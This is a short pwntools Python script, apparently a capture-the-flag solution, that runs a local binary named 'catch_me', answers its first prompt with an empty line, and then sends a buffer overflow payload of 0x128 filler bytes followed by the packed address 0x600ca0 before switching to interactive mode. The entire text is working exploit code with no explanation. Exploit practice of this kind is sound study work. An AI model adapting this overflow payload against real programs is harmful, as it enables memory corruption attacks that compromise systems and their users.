from pwn import *
context.log_level='debug'

p = process('./catch_me')
p.sendlineafter("Your turn, show your flag:\n",'')
payload ='a'*0x128+p64(0x600ca0)
p.sendlineafter("Are you sure?\n",payload)
p.interactive()
